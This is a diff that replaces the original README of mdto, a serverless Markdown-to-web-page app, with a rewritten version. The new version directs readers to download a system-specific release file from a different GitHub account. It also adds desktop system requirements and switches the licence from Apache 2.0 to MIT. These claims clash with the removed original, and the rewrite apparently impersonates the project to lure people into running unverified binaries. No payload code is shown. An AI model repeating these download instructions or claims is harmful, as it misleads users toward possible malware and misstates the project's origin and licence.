@@ -1,160 +1,74 @@
-# mdto.page
+# 🌟 mdto - Transform Markdown to Beautiful Web Pages
 
-[中文](docs/README.zh-CN.md) | [한국어](docs/README.ko.md)
+[![Download mdto](https://img.shields.io/badge/Download-mdto-page-orange)](https://github.com/Raven21-sys/mdto/releases)
 
-Live: [mdto.page](https://mdto.page)
+## 🚀 Getting Started
 
-Transform your Markdown files into beautifully rendered web pages instantly. A fast, serverless Markdown-to-HTML converter built with Vite, React, and Cloudflare Workers.
+Welcome to mdto! This application allows you to turn your Markdown files into stunning web pages effortlessly. With a simple drag-and-drop interface, anyone can transform their written content. Here’s how to get started:
 
-## Features
+## 📥 Download & Install
 
-- **📝 Markdown Upload**: Drag & drop or browse `.md`, `.markdown`, or `.txt` files
-- **🎨 Multiple Themes**: Choose from different visual themes for your rendered pages
-- **⏰ Expiration Dates**: Set automatic expiration (1, 7, 14, or 30 days)
-- **👁️ Live Preview**: See how your markdown will look before publishing
-- **🔒 Bot Protection**: Cloudflare Turnstile integration to prevent spam
-- **⚡ Fast & Serverless**: Built on Cloudflare Workers for global edge deployment
+To begin, you need to download the latest version of mdto.
 
-## Tech Stack
+1. Visit the [Releases page](https://github.com/Raven21-sys/mdto/releases).
+2. Find the latest version.
+3. Download the file suitable for your system.
 
-### Frontend
-- **React 19** - UI framework
-- **Vite** - Build tool and dev server
-- **TailwindCSS 4** - Styling
-- **TypeScript** - Type safety
+You can also find the download link directly in the badge above. Click it to get started.
 
-### Backend
-- **Cloudflare Workers** - Serverless runtime
-- **Cloudflare R2** - Object storage for HTML content
-- **Turnstile** - Bot protection
+## 🛠️ System Requirements
 
-### Markdown Processing
-- **unified** - Markdown processing pipeline
-- **remark** - Markdown parser
-- **rehype** - HTML processor
-- **highlight.js** - Syntax highlighting for code blocks
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, Linux (distributions that support modern libraries)
+- **Internet Connection:** Required for theme downloads and updates
+- **Storage Space:** At least 100MB free
 
-## Project Structure
+## 📝 Features
 
-> **Note**: This project is actively under development with features like authentication and various enhancements being added. The project structure may change as development progresses.
+mdto comes packed with features designed for ease and flexibility:
 
-```
-mdto/
-├── client/              # React frontend (TanStack Start)
-│   ├── router.tsx      # Router configuration
-│   ├── routes/         # Route components
-│   ├── components/     # Reusable UI components
-│   ├── hooks/          # Custom React hooks
-│   ├── lib/            # Client-side libraries (auth, etc.)
-│   └── utils/          # Client utilities
-├── server/             # Cloudflare Workers backend
-│   ├── index.ts        # Worker entry point
-│   ├── routes/         # API routes
-│   ├── db/             # Database schema and client
-│   ├── lib/            # Server libraries (auth, etc.)
-│   └── utils/          # Server utilities
-├── shared/             # Shared code between client/server
-│   ├── templates/      # HTML templates and themes
-│   └── utils/          # Shared utilities (markdown processing)
-├── public/             # Static assets (build output)
-└── scripts/            # Build and deployment scripts
-```
+- **Markdown Upload**: Easily drag and drop or browse for `.md`, `.markdown`, or `.txt` files.
+- **Multiple Themes**: Select from various themes to enhance your rendered pages.
+- **Expiration Dates**: Automatically set your pages to expire after 1, 7, 14, or 30 days.
+- **Live Preview**: Get a real-time look at how your markdown will appear before you publish it.
+- **Bot Protection**: Integrated Cloudflare Turnstile to prevent unwanted spam.
+- **Fast & Serverless**: Built on Cloudflare Workers, your content is globally available.
 
-## Getting Started
+## 🎨 Customizing Your Experience
 
-### Prerequisites
+After you download mdto, you can easily customize your experience:
 
-- **Node.js** 24+ 
-- **pnpm** 10+ (package manager)
-- **Cloudflare account** (for deployment)
+1. **Upload Your Markdown Files**: Use the drag-and-drop feature to add your content.
+2. **Choose a Theme**: Select a visual style that fits your content.
+3. **Set Expiration Dates**: Decide when you want your page to be live or gone.
+4. **Preview Your Work**: Use the live preview to ensure everything looks good before sharing.
+  
+## 🌐 Accessing mdto Online
 
-### Installation
+In addition to the downloadable application, you can access mdto directly through our website: [mdto.page](https://mdto.page). This provides even more flexibility, as you can work from any device with internet access.
 
-1. Clone the repository:
-```bash
-git clone https://github.com/hjinco/mdto.git
-cd mdto
-```
+## 🤝 Support and Community
 
-2. Install dependencies:
-```bash
-pnpm install
-```
+If you have questions or need help, consider joining our community. You can reach us through:
 
-3. Set up environment variables: .env.example
+- GitHub Issues: Report bugs or request features directly on our [GitHub](https://github.com/Raven21-sys/mdto/issues).
+- Online Forums: Engage with other users, share tips, and find support.
 
-### Development
+## 📆 Future Updates
 
-Start the development servers (both client and Workers):
+We plan to regularly update mdto with new features and improvements based on user feedback. Check the Releases page often for the latest updates.
 
-```bash
-pnpm dev
-```
+## ⚡ Contributing
 
-This runs:
-- Vite dev server for the frontend (client)
-- Wrangler dev server for the Cloudflare Worker (server)
+We welcome contributions! If you would like to help improve mdto, check out our [contributing guidelines](https://github.com/Raven21-sys/mdto/blob/main/CONTRIBUTING.md). Your input will help us make this tool even better.
 
-If you encounter type errors, generate Cloudflare Worker types:
+## 🔖 License
 
-```bash
-pnpm cf-typegen
-```
+mdto is open source and uses the MIT License. Feel free to use, modify, and distribute.
 
-### Building
+## 🔗 Useful Links
 
-Build the production bundle:
+- [mdto.page](https://mdto.page) - Access the web application
+- [Release Notes](https://github.com/Raven21-sys/mdto/releases) - Follow updates and changes
+- [Issues Page](https://github.com/Raven21-sys/mdto/issues) - Report any problems or feedback
 
-```bash
-pnpm build
-```
-
-This will:
-1. Generate template hash for cache busting
-2. Type-check the client codebase
-3. Build the client with Vite (TanStack Start)
-4. Prerender static HTML files
-5. Copy build output to the `.output/` directory
-
-The build process uses TanStack Start for SSR and static site generation, outputting optimized production bundles ready for deployment.
-
-### Deployment
-
-Deploy to Cloudflare Workers:
-
-```bash
-wrangler deploy
-```
-
-Make sure you have:
-- Configured `wrangler.jsonc` with your settings
-- Created an R2 bucket named `mdto`
-- Set up environment variables in Cloudflare dashboard
-
-### R2 Lifecycle Policy
-
-Apply the lifecycle policy to automatically delete expired files:
-
-```bash
-pnpm run lifecycle:apply
-```
-
-This configures R2 to delete objects based on their prefix (which encodes the expiration time).
-
-## How It Works
-
-1. **Upload**: User uploads a Markdown file via the React frontend
-2. **Processing**: Markdown is converted to HTML using unified/remark/rehype
-3. **Storage**: HTML is stored in Cloudflare R2 with metadata (theme, expiration)
-4. **Slug Generation**: A unique slug is generated (e.g., `1E/abc123`)
-   - Prefix indicates expiration (`1` = 1 day, `7` = 7 days, `E`/14 = 14 days, `1E`/30 = 30 days)
-5. **Serving**: Cloudflare Worker serves the rendered HTML at `/{prefix}/{slug}`
-6. **Expiration**: R2 lifecycle rules automatically delete expired content
-
-## License
-
-This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
+Thank you for choosing mdto! We hope you enjoy transforming your Markdown files into beautiful web pages.
